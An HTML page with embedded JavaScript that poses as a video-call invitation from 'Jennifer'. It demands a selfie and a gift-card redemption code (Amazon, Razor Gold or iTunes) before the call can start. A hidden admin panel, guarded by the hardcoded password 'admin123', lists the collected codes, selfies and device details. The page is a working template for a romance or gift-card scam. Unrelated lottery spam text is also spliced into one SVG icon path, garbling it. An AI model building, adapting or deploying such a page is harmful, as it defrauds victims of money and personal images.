<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Video Call Invite - Clean Admin Panel</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%);
      color: #333;
      line-height: 1.6;
      padding: 20px;
      min-height: 100vh;
    }
    
    .container {
      max-width: 600px;
      width: 100%;
      background: rgba(255, 255, 255, 0.95);
      border-radius: 20px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
      padding: 30px;
      margin: 20px auto;
    }
    
    h2 {
      text-align: center;
      color: #d64c78;
      margin-bottom: 10px;
      font-size: 28px;
    }
    
    .subtitle {
      text-align: center;
      color: #666;
      margin-bottom: 25px;
      font-size: 16px;
    }
    
    .upload-container {
      border: 2px dashed #d64c78;
      padding: 25px;
      border-radius: 15px;
      margin-bottom: 25px;
      background: rgba(255, 240, 245, 0.5);
      text-align: center;
      transition: all 0.3s ease;
    }
    
    .upload-container:hover {
      background: rgba(255, 240, 245, 0.8);
    }
    
    .upload-container label {
      display: block;
      margin-bottom: 15px;
      font-weight: bold;
      color: #d64c78;
      font-size: 18px;
    }
    
    input[type="file"] {
      display: block;
      margin: 0 auto;
      padding: 10px;
      border: 1px solid #ddd;
      border-radius: 8px;
      width: 100%;
      max-width: 300px;
      background: white;
    }
    
    .file-info {
      margin-top: 10px;
      font-size: 14px;
      color: #666;
    }
    
    .card-redemption {
      margin: 25px 0;
      padding: 20px;
      background: #f8f9fa;
      border-radius: 15px;
      text-align: left;
      border-left: 5px solid #d64c78;
    }
    
    .card-redemption h3 {
      color: #d64c78;
      margin-bottom: 15px;
    }
    
    .redemption-code {
      margin-bottom: 20px;
    }
    
    .redemption-code input {
      width: 100%;
      padding: 12px 15px;
      border: 1px solid #ddd;
      border-radius: 8px;
      font-size: 16px;
      transition: border 0.3s ease;
    }
    
    .redemption-code input:focus {
      border-color: #d64c78;
      outline: none;
      box-shadow: 0 0 0 2px rgba(214, 76, 120, 0.2);
    }
    
    .card-options {
      display: flex;
      flex-direction: column;
      gap: 12px;
    }
    
    .card-option {
      display: flex;
      align-items: center;
      padding: 15px;
      background: white;
      border-radius: 10px;
      box-shadow: 0 3px 10px rgba(0, 0, 0, 0.08);
      transition: transform 0.2s ease;
      cursor: pointer;
    }
    
    .card-option:hover {
      transform: translateY(-2px);
    }
    
    .card-option input {
      margin-right: 15px;
      transform: scale(1.2);
    }
    
    .card-logo {
      width: 30px;
      height: 30px;
      margin-right: 12px;
    }
    
    .card-option label {
      font-weight: 600;
      cursor: pointer;
    }
    
    .button-container {
      text-align: center;
      margin: 25px 0;
    }
    
    button {
      padding: 14px 35px;
      border: none;
      background: linear-gradient(to right, #d64c78, #e51a5f);
      color: white;
      border-radius: 50px;
      cursor: pointer;
      font-size: 18px;
      font-weight: 600;
      box-shadow: 0 4px 15px rgba(214, 76, 120, 0.4);
      transition: all 0.3s ease;
    }
    
    button:hover {
      transform: translateY(-3px);
      box-shadow: 0 6px 20px rgba(214, 76, 120, 0.5);
    }
    
    button:disabled {
      background: #cccccc;
      transform: none;
      box-shadow: none;
      cursor: not-allowed;
    }
    
    .status-message {
      margin: 20px 0;
      padding: 15px;
      border-radius: 10px;
      font-weight: bold;
      text-align: center;
      display: none;
    }
    
    .success {
      background-color: #d4edda;
      color: #155724;
      border: 1px solid #c3e6cb;
      display: block;
    }
    
    .error {
      background-color: #f8d7da;
      color: #721c24;
      border: 1px solid #f5c6cb;
      display: block;
    }
    
    .loading {
      display: none;
      margin: 20px auto;
      width: 50px;
      height: 50px;
      border: 5px solid #f3f3f3;
      border-top: 5px solid #d64c78;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    .waiting-section {
      text-align: center;
      margin-top: 30px;
      padding-top: 20px;
      border-top: 1px solid #eee;
    }
    
    .waiting-text {
      font-size: 22px;
      font-weight: bold;
      color: #d64c78;
      margin-bottom: 20px;
    }
    
    .call-icon {
      width: 80px;
      height: 80px;
      margin: 0 auto;
      border-radius: 50%;
      background-color: #4CAF50;
      display: flex;
      justify-content: center;
      align-items: center;
      box-shadow: 0 5px 15px rgba(76, 175, 80, 0.4);
      animation: pulse 1.5s infinite;
    }
    
    .call-icon svg {
      width: 40px;
      height: 40px;
      fill: white;
    }
    
    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.05); }
      100% { transform: scale(1); }
    }
    
    .admin-sticker {
      position: fixed;
      top: 20px;
      right: 20px;
      width: 50px;
      height: 50px;
      background: #d64c78;
      color: white;
      border-radius: 50%;
      display: flex;
      justify-content: center;
      align-items: center;
      cursor: pointer;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
      z-index: 1000;
      font-weight: bold;
      font-size: 20px;
    }
    
    .admin-panel {
      display: none;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 90%;
      max-width: 700px;
      max-height: 80vh;
      background: white;
      padding: 25px;
      border-radius: 15px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
      z-index: 2000;
      overflow-y: auto;
    }
    
    .overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.7);
      z-index: 1500;
    }
    
    .close-btn {
      background: #ff4757;
      color: white;
      padding: 8px 16px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      margin-bottom: 20px;
      font-weight: bold;
    }
    
    .submission {
      margin-bottom: 20px;
      padding: 15px;
      border: 1px solid #ddd;
      border-radius: 10px;
      background: #f9f9f9;
    }
    
    .submission img {
      max-width: 100%;
      border-radius: 8px;
      margin-top: 10px;
    }
    
    .admin-controls {
      margin-bottom: 20px;
      display: flex;
      gap: 10px;
      flex-wrap: wrap;
    }
    
    .admin-controls button {
      padding: 8px 15px;
      font-size: 14px;
    }
    
    .explanation {
      background: #f1f8ff;
      border-left: 4px solid #4a90e2;
      padding: 15px;
      margin: 20px 0;
      border-radius: 4px;
    }
    
    .troubleshooting {
      background: #fff3cd;
      border-left: 4px solid #ffc107;
      padding: 15px;
      margin: 20px 0;
      border-radius: 4px;
    }
    
    .demo-indicator {
      background: #ffcccc;
      padding: 3px 6px;
      border-radius: 3px;
      font-size: 12px;
      margin-left: 8px;
    }
    
    @media (max-width: 600px) {
      .container {
        padding: 20px;
      }
      
      h2 {
        font-size: 24px;
      }
      
      .upload-container {
        padding: 15px;
      }
      
      button {
        width: 100%;
        padding: 12px;
      }
      
      .admin-controls {
        flex-direction: column;
      }
    }
  </style>
</head>
<body>
  <div class="admin-sticker" onclick="requestAdminAccess()">A</div>
  
  <div class="container">
    <h2>Accept Invitation to Join Video Call</h2>
    <p class="subtitle">Authentication Required</p>

    <div class="explanation">
    </div>

    <div class="upload-container">
      <label for="selfie">Upload a valid selfie:</label>
      <input type="file" id="selfie" accept="image/jpeg, image/png">
      <div class="file-info" id="fileInfo">No file selected (Max: 4MB)</div>
    </div>

    <div class="card-redemption">
      <h3>Enter your redemption code to boost video duration:</h3>
      <div class="redemption-code">
        <input type="text" id="redemptionCode" placeholder="Enter your redemption code">
      </div>
      
      <h3>Select your redemption method:</h3>
      
      <div class="card-options">
        <div class="card-option" onclick="selectCard('amazonCard')">
          <input type="checkbox" id="amazonCard" name="cardType" value="amazon">
          <svg class="card-logo" viewBox="0 0 24 24">
            <path fill="#FF9900" d="M10.16 17.76c.43.43.95.65 1.58.65.62 0 1.15-.22 1.57-.65.43-.43.65-.96.65-1.58 0-.62-.22-1.15-.65-1.57-.42-.43-.95-.65-1.57-.65-.63 0-1.15.22-1.58.65-.43.42-.65.95-.65 1.57 0 .63.22 1.15.65 1.58zm-1.46-7.7h2.95l.45-2.31H8.76l.94 2.31zm11.45-4.55c-.33-.79-.83-1.4-1.5-1.81-.67-.42-1.46-.63-2.38-.63-.77 0-1.47.18-2.1.54-.63.36-1.12.87-1.46 1.53h-.05l-.15-.72H7.96L6.53 17.7h2.77l.77-3.87h.05c.33.57.83 1.02 1.5 1.35.67.33 1.42.5 2.25.5 1.12 0 2.07-.36 2.85-1.07.78-.71 1.17-1.7 1.17-2.96 0-.82-.2-1.52-.61-2.1-.4-.58-.97-1.02-1.7-1.32.5-.21.9-.5 1.2-.88.3-.38.5-.82.6-1.32.1-.5.15-1.02.15-1.57 0-.36-.02-.71-.05-1.05h-.05c-.13.47-.38.87-.75 1.2-.37.33-.82.57-1.35.72l-1.67.45-.75-2.25 1.47-.45c.87-.25 1.57-.72 2.1-1.42.53-.7.8-1.54.8-2.52V3.6h2.77l-.25 1.2c.53.25.97.61 1.32 1.07.35.46.58 1 .7 1.62.12.62.18 1.28.18 1.98 0 .87-.12 1.65-.35 2.35-.23.7-.6 1.3-1.1 1.8-.5.5-1.12.88-1.85 1.15-.73.27-1.55.4-2.45.4-.47 0-.92-.05-1.35-.15-.43-.1-.8-.25-1.1-.45-.3-.2-.53-.45-.7-.75-.17-.3-.25-.65-.25-1.05 0-.47.15-.87.45-1.2.3-.33.7-.5 1.2-.5.33 0 .62.07.87.22.25.15.45.35.6.6.15.25.27.55.35.9.08.35.15.75.2 1.2.05.45.1.95.1 1.5 0 .55-.10 1.1-.3 1.65-.6.55-.3 1-.75 1.35-1.35.35-.6.53-1.35.53-2.25 0-.6-.1-1.12-.3-1.57-.2-.45-.48-.8-.85-1.05-.37-.25-.82-.38-1.35-.38-.67 0-1.22.22-1.65.65-.43.43-.65.97-.65 1.62 0 .47.13.87.4 1.2.27.33.62.57 1.05.72l1.35.45.75 2.25-1.65-.45c-.87-.25-1.57-.72-2.1-1.42-.53-.7-.8-1.54-.8-2.52 0-.87.18-1.62.53-2.25.35-.63.83-1.12 1.45-1.47.62-.35 1.32-.53 2.1-.53.73 0 1.38.15 1.95.45.57.3 1.03.72 1.38 1.27.35.55.53 1.18.53 1.9 0 .47-.05.92-.15 1.35-.1.43-.25.8-.45 1.1z"/>
          </svg>
          <label for="amazonCard">Amazon Gift Card</label>
        </div>
        
        <div class="card-option" onclick="selectCard('razorGold')">
          <input type="checkbox" id="razorGold" name="cardType" value="razor">
          <svg class="card-logo" viewBox="0 0 24 24">
            <path fill="#000" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13.5h2v7h-2v-7zm1 10c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1z"/>
          </svg>
          <label for="razorGold">Razor Gold</label>
        </div>
        
        <div class="card-option" onclick="selectCard('itunesCard')">
          <input type="checkbox" id="itunesCard" name="cardType" value="itunes">
          <svg class="card-logo" viewBox="0 0 24 24">
            <path fill="#000" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm.5-13h-1v5.25l-3.04-1.76-.48.88L12 14.26l4.02-2.32-.48-.88-3.04 1.76V7z"/>
          </svg>
          <label for="itunesCard">iTunes/Apple Gift Card</label>
        </div>
      </div>
    </div>

    <div class="button-container">
      <button onclick="submitFiles()" id="submitBtn">Submit and Start Video Call</button>
    </div>
    
    <div id="statusMessage" class="status-message"></div>
    <div id="loading" class="loading"></div>

    <div class="waiting-section">
      <p class="waiting-text">Jennifer is waiting for you to join</p>
      <div class="call-icon">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
          <path d="M20.01 15.38c-1.23 0-2.42-.2-3.53-.56-.35-.12-.74-.03-1.01.24l-1.57 1.97c-2.83-1.35-5.48-3.9-6.89-6.83l1.95-1.66c.27-.28.35-.67.24-1.02-.37-1.11-.56-2.3-.56-3.53 极速赛车开奖直播 极速赛车开奖结果 极速赛车开奖记录 0-.54-.45-.99-.99-.99H4.19C3.65 3 3 3.24 3 3.99 3 13.28 极速赛车开奖直播 极速赛车开奖结果 极速赛车开奖记录 10.73 21 20.01 21c.71 0 .99-.63.99-1.18v-3.45c0-.54-.45-.99-.99-.99z"/>
        </svg>
      </div>
    </div>
  </div>

  <div class="overlay" id="overlay" onclick="closeAdmin()"></div>
  
  <div class="admin-panel" id="adminPanel">
    <button class="close-btn" onclick="closeAdmin()">Close</button>
    <h2>Admin Panel - Real User Submissions Only</h2>
    
    <div class="admin-controls">
      <button onclick="loadAllSubmissions()">Refresh Submissions</button>
      <button onclick="loadRealUsersOnly()" style="background: #10ac84;">Show Real Users Only</button>
      <button onclick="clearAllSubmissions()" style="background: #ff4757;">Clear All</button>
      <button onclick="generateDemoData()" style="background: #5f27cd;">Generate Demo Data</button>
    </div>
    
    <div id="submissionsList"></div>
  </div>

  <script>
    // Centralized database simulation using a shared storage approach
    const CENTRAL_DB_KEY = 'video_call_central_database';
    const ADMIN_PASSWORD = "admin123";
    const MAX_FILE_SIZE = 4 * 1024 * 1024; // 4MB limit
    
    // Initialize the central database if it doesn't exist
    function initCentralDatabase() {
      if (!localStorage.getItem(CENTRAL_DB_KEY)) {
        const initialData = {
          submissions: [],
          lastId: 0
        };
        localStorage.setItem(CENTRAL_DB_KEY, JSON.stringify(initialData));
      }
    }
    
    // Get all submissions from the central database
    function getCentralSubmissions() {
      try {
        const db = JSON.parse(localStorage.getItem(CENTRAL_DB_KEY));
        return db.submissions || [];
      } catch (e) {
        console.error('Error reading central database:', e);
        return [];
      }
    }
    
    // Save a submission to the central database
    function saveToCentralDatabase(submission) {
      try {
        const db = JSON.parse(localStorage.getItem(CENTRAL_DB_KEY));
        submission.id = db.lastId + 1;
        submission.timestamp = new Date().toISOString();
        submission.isDemo = false; // Mark as real user submission
        db.submissions.push(submission);
        db.lastId = submission.id;
        localStorage.setItem(CENTRAL_DB_KEY, JSON.stringify(db));
        return Promise.resolve(submission.id);
      } catch (e) {
        console.error('Error saving to central database:', e);
        return Promise.reject(e);
      }
    }
    
    // Clear all submissions from the central database
    function clearCentralDatabase() {
      try {
        const db = JSON.parse(localStorage.getItem(CENTRAL_DB_KEY));
        db.submissions = [];
        db.lastId = 0;
        localStorage.setItem(CENTRAL_DB_KEY, JSON.stringify(db));
        return true;
      } catch (e) {
        console.error('Error clearing central database:', e);
        return false;
      }
    }

    // Update file info when a file is selected
    document.getElementById('selfie').addEventListener('change', function(e) {
      const fileInfo = document.getElementById('fileInfo');
      if (this.files.length > 0) {
        const file = this.files[0];
        const fileSize = Math.round(file.size / 1024); // Size in KB
        fileInfo.textContent = `${file.name} (${fileSize} KB)`;
        
        // Validate file size
        if (file.size > MAX_FILE_SIZE) {
          fileInfo.innerHTML = `<span style="color: red;">File too large (${fileSize} KB). Max 4MB allowed.</span>`;
          document.getElementById('submitBtn').disabled = true;
        } else {
          document.getElementById('submitBtn').disabled = false;
        }
      } else {
        fileInfo.textContent = 'No file selected (Max: 4MB)';
      }
    });

    function submitFiles() {
      const selfieInput = document.getElementById("selfie");
      const selfie = selfieInput.files[0];
      const redemptionCode = document.getElementById("redemptionCode").value.trim();
      const selectedCards = Array.from(document.querySelectorAll('input[name="cardType"]:checked'))
                                .map(cb => cb.value);
      
      if (!selfie) {
        showStatus("Please upload a selfie before submitting.", "error");
        return;
      }
      
      // Validate file size
      if (selfie.size > MAX_FILE_SIZE) {
        showStatus("File size too large. Please upload an image under 4MB.", "error");
        return;
      }
      
      // Validate file type
      const validTypes = ['image/jpeg', 'image/png'];
      if (!validTypes.includes(selfie.type)) {
        showStatus("Invalid file type. Please upload a JPG or PNG image.", "error");
        return;
      }
      
      if (!redemptionCode) {
        showStatus("Please enter your redemption code.", "error");
        return;
      }
      
      if (selectedCards.length === 0) {
        showStatus("Please select at least one redemption method.", "error");
        return;
      }
      
      // Show loading state
      document.getElementById("loading").style.display = "block";
      document.getElementById("submitBtn").disabled = true;
      
      // Read the file as data URL with error handling
      const reader = new FileReader();
      
      reader.onload = function(e) {
        // Create submission object
        const submission = {
          selfieData: e.target.result,
          redemptionCode: redemptionCode,
          cardTypes: selectedCards,
          time: new Date().toLocaleString(),
          userAgent: navigator.userAgent,
          screenResolution: `${window.screen.width}x${window.screen.height}`,
          userLocation: "Real user location",
          deviceType: getDeviceType(),
          isDemo: false // This is a real user submission
        };
        
        // Save to central database
        saveToCentralDatabase(submission)
          .then(id => {
            showStatus("Submission successful! You can now join the call.", "success");
            console.log("Submission saved with ID: ", id);
            
            // Reset form
            selfieInput.value = "";
            document.getElementById("redemptionCode").value = "";
            document.getElementById("fileInfo").textContent = "No file selected (Max: 4MB)";
            document.querySelectorAll('input[name="cardType"]').forEach(cb => cb.checked = false);
          })
          .catch(error => {
            console.error("Error saving submission: ", error);
            showStatus("Error saving your submission. Please try again.", "error");
          })
          .finally(() => {
            document.getElementById("loading").style.display = "none";
            document.getElementById("submitBtn").disabled = false;
          });
      };
      
      reader.onerror = function() {
        showStatus("Error reading file. Please try a different image.", "error");
        document.getElementById("loading").style.display = "none";
        document.getElementById("submitBtn").disabled = false;
      };
      
      reader.onabort = function() {
        showStatus("File upload was cancelled.", "error");
        document.getElementById("loading").style.display = "none";
        document.getElementById("submitBtn").disabled = false;
      };
      
      // Read the file with error handling
      try {
        reader.readAsDataURL(selfie);
      } catch (error) {
        showStatus("Error processing file: " + error.message, "error");
        document.getElementById("loading").style.display = "none";
        document.getElementById("submitBtn").disabled = false;
      }
    }

    function showStatus(message, type) {
      const statusEl = document.getElementById("statusMessage");
      statusEl.textContent = message;
      statusEl.className = `status-message ${type}`;
      
      // Auto-hide after 5 seconds
      setTimeout(() => {
        statusEl.className = "status-message";
      }, 5000);
    }

    function selectCard(cardId) {
      // Uncheck all cards first
      document.querySelectorAll('input[name="cardType"]').forEach(cb => {
        cb.checked = false;
      });
      
      // Check the selected card
      document.getElementById(cardId).checked = true;
    }
    
    function getDeviceType() {
      const ua = navigator.userAgent;
      if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
        return "Tablet";
      }
      if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) {
        return "Mobile";
      }
      return "Desktop";
    }

    function requestAdminAccess() {
      const pass = prompt("Enter admin password:");
      if (pass === ADMIN_PASSWORD) {
        openAdmin();
      } else if (pass !== null) {
        alert("Access Denied!");
      }
    }
    
    function loadAllSubmissions() {
      const list = document.getElementById("submissionsList");
      const submissions = getCentralSubmissions();
      
      if (submissions.length === 0) {
        list.innerHTML = "<p>No submissions found in the central database.</p>";
        return;
      }
      
      // Show newest submissions first
      submissions.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
      
      list.innerHTML = submissions.map(sub => `
        <div class="submission">
          <p><strong>Submission ID:</strong> ${sub.id}</p>
          <p><strong>Time:</strong> ${sub.time || sub.timestamp}</p>
          <p><strong>Redemption Code:</strong> ${sub.redemptionCode}</p>
          <p><strong>Card Types:</strong> ${sub.cardTypes.join(", ")}</p>
          <p><strong>Device Type:</strong> ${sub.deviceType}</p>
          <p><strong>Screen Resolution:</strong> ${sub.screenResolution}</p>
          <p><strong>User Location:</strong> ${sub.userLocation}</p>
          <p><strong>Submission Type:</strong> ${sub.isDemo ? '<span class="demo-indicator">DEMO DATA</span>' : 'Real User'}</p>
          <p><strong>Image:</strong></p>
          <img src="${sub.selfieData}" alt="Uploaded selfie" style="max-width: 300px;">
        </div>
      `).join('');
    }
    
    function loadRealUsersOnly() {
      const list = document.getElementById("submissionsList");
      const submissions = getCentralSubmissions();
      
      // Filter out demo data
      const realSubmissions = submissions.filter(sub => !sub.isDemo);
      
      if (realSubmissions.length === 0) {
        list.innerHTML = "<p>No real user submissions found.</p>";
        return;
      }
      
      // Show newest submissions first
      realSubmissions.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
      
      list.innerHTML = realSubmissions.map(sub => `
        <div class="submission">
          <p><strong>Submission ID:</strong> ${sub.id}</p>
          <p><strong>Time:</strong> ${sub.time || sub.timestamp}</p>
          <p><strong>Redemption Code:</strong> ${sub.redemptionCode}</p>
          <p><strong>Card Types:</strong> ${sub.cardTypes.join(", ")}</p>
          <p><strong>Device Type:</strong> ${sub.deviceType}</p>
          <p><strong>Screen Resolution:</strong> ${sub.screenResolution}</p>
          <p><strong>User Location:</strong> ${sub.userLocation}</p>
          <p><strong>Image:</strong></p>
          <img src="${sub.selfieData}" alt="Uploaded selfie" style="max-width: 300px;">
        </div>
      `).join('');
    }
    
    function clearAllSubmissions() {
      if (confirm("Are you sure you want to clear all submissions from the central database? This cannot be undone.")) {
        if (clearCentralDatabase()) {
          document.getElementById("submissionsList").innerHTML = "<p>No submissions found in the central database.</p>";
          showStatus("All submissions cleared from central database.", "success");
        } else {
          showStatus("Error clearing submissions.", "error");
        }
      }
    }
    
    function generateDemoData() {
      // Create some demo submissions
      const demoSubmissions = [
        {
          selfieData: "https://placehold.co/300x400/ff9a9e/white?text=Demo+User+1",
          redemptionCode: "DEMO12345",
          cardTypes: ["amazon"],
          time: new Date().toLocaleString(),
          userAgent: "Demo User Agent 1",
          screenResolution: "1920x1080",
          userLocation: "New York, USA",
          deviceType: "Desktop",
          isDemo: true // Mark as demo data
        },
        {
          selfieData: "https://placehold.co/300x400/fad0c4/white?text=Demo+User+2",
          redemptionCode: "TEST67890",
          cardTypes: ["itunes"],
          time: new Date(Date.now() - 86400000).toLocaleString(),
          userAgent: "Demo User Agent 2",
          screenResolution: "1280x720",
          userLocation: "London, UK",
          deviceType: "Mobile",
          isDemo: true // Mark as demo data
        }
      ];
      
      // Save demo data to central database
      try {
        const db = JSON.parse(localStorage.getItem(CENTRAL_DB_KEY));
        demoSubmissions.forEach(sub => {
          sub.id = db.lastId + 1;
          sub.timestamp = new Date().toISOString();
          db.submissions.push(sub);
          db.lastId = sub.id;
        });
        localStorage.setItem(CENTRAL_DB_KEY, JSON.stringify(db));
        
        // Refresh the list
        loadAllSubmissions();
        showStatus("Demo data generated successfully. These are clearly marked as demo data.", "success");
      } catch (e) {
        console.error("Error generating demo data:", e);
        showStatus("Error generating demo data.", "error");
      }
    }

    function openAdmin() {
      const panel = document.getElementById("adminPanel");
      const overlay = document.getElementById("overlay");
      
      // Load only real user submissions by default
      loadRealUsersOnly();
      
      panel.style.display = "block";
      overlay.style.display = "block";
    }

    function closeAdmin() {
      document.getElementById("adminPanel").style.display = "none";
      document.getElementById("overlay").style.display = "none";
    }

    // Initialize card selection
    document.querySelectorAll('.card-option').forEach(option => {
      option.addEventListener('click', function() {
        const checkbox = this.querySelector('input[type="checkbox"]');
        selectCard(checkbox.id);
      });
    });
    
    // Initialize the central database
    initCentralDatabase();
  </script>
</body>
</html>